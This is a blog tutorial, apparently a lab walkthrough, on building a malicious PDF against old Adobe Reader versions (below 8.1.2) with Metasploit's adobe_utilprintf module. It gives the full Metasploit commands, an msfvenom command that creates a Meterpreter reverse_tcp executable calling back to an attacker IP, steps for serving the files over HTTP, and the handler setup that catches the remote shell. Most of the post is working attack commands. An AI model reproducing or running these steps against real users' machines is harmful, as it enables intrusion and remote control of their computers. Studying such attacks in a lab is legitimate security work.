---
title: "Create malicious PDF"
date: "2020-02-10"
layout: single
tags:
- Malicious
categories:
- Blog-post
---

Malicious PDF is one of the way to hack users because this document format and Adobe Reader (PDF reader) are used by almost everyone.

In this article, I will show you how to generate our malicious PDF using Metasploit. We gonna use an old exploit for a vulnerable Adobe Reader version.

**This article is for research and education purpose only**. Do with your own risk!

**The exploit is targeting a specific version of Adobe Reader** which is **vulnerable Adobe Reader version** (less than 8.1.2). So, you need to install this version first on your Windows XP target machine as mention in Metasploit module.

## 1. Generate malicious pdf
We gonna use `adobe_utilprintf` vulnerability

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/malpdf/1.PNG)

    use exploit/windows/fileformat/adobe_utilprintf
    set filename malicious.pdf
    set payload windows/exec
    set cmd malware.exe
    exploit

## 2. Create reverse shell executable
Copy the malicious pdf to a directory that we gonna setup our HTTP server.
And create a reverse shell executable using msvenom.

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/malpdf/2.PNG)

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.83.128 LPORT=1111 -f exe > malware.exe

Note:
Change LHOST with your IP

## 3. Download executable and PDF  in the target machine

You can use this python line to step up local HTTP server.

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/malpdf/3.PNG)

    python -m SimpleHTTPServer

Rename `evil.exe` to `malware.exe` (if you name the executable as evil.exe during generating reverse shell executable using msfvenom)

Download both of the files, and copy `malware.exe` to `System32` folder

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/malpdf/4.PNG)

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/malpdf/5.PNG)

## 4. Listen to reverse shell

Listen to reverse shell and wait for the execution of the file.

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/malpdf/6.PNG)

    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set lhost 192.168.83.128
    set lport 1111
    run

## 5. We're in 🎉 
After we double click the PDF, the exploit will run. So, our classic exploit is successful!

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/malpdf/7.PNG)

